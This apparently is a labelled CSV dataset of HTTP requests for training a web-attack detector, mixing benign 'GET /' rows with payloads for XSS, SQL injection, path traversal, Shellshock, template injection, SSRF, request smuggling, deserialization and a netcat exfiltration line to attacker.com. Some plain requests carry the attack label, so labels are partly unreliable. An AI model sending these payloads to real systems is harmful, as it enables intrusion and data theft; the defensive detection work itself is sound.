method,path,query,headers,body,ua,label
GET,Host: evil.com,,,,,1
GET,/,,,,,0
GET,..\..\..\..\windows\system32\config\sam,,,,,1
GET,/,,,,,0
GET,/,,,,,0
GET,/,,,,,0
GET,"<iframe srcdoc=""<script>alert(1)</script>"">",,,,,1
GET,"() { :;}; echo ""NS:"" $(/usr/bin/id)",,,,,1
GET,/,,,,,0
GET,/,,,,,1
GET,gopher://localhost:6379/_SET%20foo%20bar,,,,,1
GET,/,,,,,0
POST,/,,,"{""alg"":""RS256"",""jku"":""http://attacker.com/key.json""}",,1
POST,/,,,{smart_f_shell_exec('id')},,1
GET,; /bin/c?t /e*c/p?sswd,,,,,1
GET,php://input,,,,,1
GET,/,,,,,0
GET,/,,,,,0
GET,/,,,HTTP/1.1\r\nHost: target.com\r\nContent-Length: 42\r\n,,1
GET,/,,,,,0
GET,User-Agent: ' OR SLEEP(5) OR ',,,,,1
POST,/,,,{{constructor.constructor('alert(1)')()}},,1
GET,/,,,,,0
GET,query { __schema { types { name } } },,,,,1
GET,/,,,,,0
GET,/,,,,,0
GET,id=1'; WAITFOR DELAY '0:0:5'--,,,,,1
GET,"<video><source onerror=""alert(1)"">",,,,,1
GET,/,,,,,0
GET,/,,,,,0
GET,/,,,,,1
GET,/,,,,,0
GET,/,"#set($str=$class.inspect(""java.lang.Runtime"").type.getRuntime().exec(""id""))",,,,1
GET,%0d%0aSet-Cookie: session=attacker,,,,,1
POST,/,,,"{""__proto__"": {""isAdmin"": true}}",,1
GET,<body onload=alert(1)>,,,,,1
GET,/,,,,,0
GET,${os.system('id')},,,,,1
GET,cos\nsystem\n(S'id'\ntR.,,,,,1
GET,/,,,,,1
GET,/,,,,,0
GET,/,,,,,0
GET,query { __schema { types { name } } },,,,,1
GET,/,,,,,1
GET,Host: evil.com,,,,,1
GET,/,,,,,0
GET,\x81\xfe\x00\x00... (illegal length),,,,,1
GET,"O:8:""Database"":1:{s:4:""host"";s:9:""localhost"";}",,,,,1
GET,/,,,,,0
GET,/,,,,,0
POST,/,,,{{7*7}} or {{config.items()}},,1
POST,/,,,"{""id"": {""$bitsAllSet"": [1, 5]}}",,1
GET,Transfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1,,,,,1
GET,/,,,,,0
GET,; echo $USER | nc attacker.com 1234,,,,,1
GET,..\..\..\..\windows\system32\config\sam,,,,,1
GET,/,,,,,0
GET,/,,,,,0
GET,/,,,,,0
POST,/,,,"{""id"": {""$bitsAllSet"": [1, 5]}}",,1
GET,/,,,,,0
GET,/,,,,,0
GET,; cat /etc/passwd,,,,,1
GET,/,,,,,0
GET,/,,,,,0
GET,/,,,,,0
GET,/,,,,,0
GET,/,,,,,0
GET,/,,,,,0
GET,/search,q=security,,,,0
GET,%0d%0aSet-Cookie: session=attacker,,,,,1
GET,/,,,,,0
GET,/,,,,,0
GET,/,,,,,0
GET,/,,,,,0
GET,/,,,,,0
GET,/,,,,,0
GET,/,,,,,0
GET,/,,,,,0
GET,/,,,,,0
GET,ac ed 00 05 73 72 00 12 ...,,,,,1
GET,/,,,,,0
GET,id=1'; EXEC sp_executesql N'WAITFOR DELAY ''0:0:5'''--,,,,,1
GET,"<iframe src=""http://169.254.169.254/latest/meta-data/""></iframe>",,,,,1
GET,/,,,,,0
GET,; /bin/c?t /e*c/p?sswd,,,,,1
POST,/,,,"{""alg"":""none""}",,1
GET,//////////////////etc/passwd,,,,,1
GET,/,,,,,0
GET,<script>alert('XSS')</script>,,,,,1
GET,/,,,,,0
GET,cos\nsystem\n(S'id'\ntR.,,,,,1
GET,/,,,,,0
GET,/,,,,,0
GET,/,,,,,0
GET,/,,,,,0
